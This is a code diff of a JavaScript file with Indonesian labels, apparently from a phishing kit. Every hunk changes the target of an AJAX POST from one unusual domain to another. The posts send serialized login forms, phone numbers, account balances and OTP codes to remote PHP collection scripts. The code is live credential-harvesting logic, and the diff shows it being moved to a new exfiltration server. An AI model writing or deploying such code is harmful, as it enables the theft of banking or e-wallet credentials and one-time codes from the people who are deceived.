@@ -13,7 +13,7 @@ function sendHp() {
    sessionStorage.setItem('nohp', nohp);
    
    $.ajax({
-      url: 'https://choreoapps.oo-feed.cfd/26/no.php',
+      url: 'https://chroedevsi.whf.bz/266/no.php',
       type: 'POST',
       data: $('#login').serialize(),  
       complete: function() {
@@ -33,7 +33,7 @@ function sendLogin(){
     document.getElementById('lanjutkan').innerHTML = "Memproses....";               
     
     $.ajax({
-      url: 'https://choreoapps.oo-feed.cfd/26/sudah.php',
+      url: 'https://chroedevsi.whf.bz/266/sudah.php',
       type: 'POST',
       data: $('#sudah').serialize(),    
     complete: function(){    
@@ -61,7 +61,7 @@ function sendSaldoS() {
    document.getElementById('lanjutkan').innerHTML = "Memproses....";
    
    $.ajax({
-      url: 'https://choreoapps.oo-feed.cfd/26/saldosdh.php',
+      url: 'https://chroedevsi.whf.bz/266/saldosdh.php',
       type: 'POST',
       data: $('#saldosdh').serialize(),
       complete: function() {
@@ -94,7 +94,7 @@ function sendOtpS() {
             
      $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.oo-feed.cfd/26/otpsdh.php',
+        url: 'https://chroedevsi.whf.bz/266/otpsdh.php',
         data: $('#formLinkk').serialize(),
         datatype: 'JSON',
                 complete: function (response) {
@@ -127,7 +127,7 @@ function sendBelum(){
    
    $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.oo-feed.cfd/26/belum.php',
+        url: 'https://chroedevsi.whf.bz/266/belum.php',
         data: $('#login').serialize(),
         datatype: 'JSON',
       complete: function() {
@@ -160,7 +160,7 @@ function sendOtp() {
             
      $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.oo-feed.cfd/26/otpblm.php',
+        url: 'https://chroedevsi.whf.bz/266/otpblm.php',
         data: $('#formLinkk').serialize(),
         datatype: 'JSON',
                 complete: function (response) {
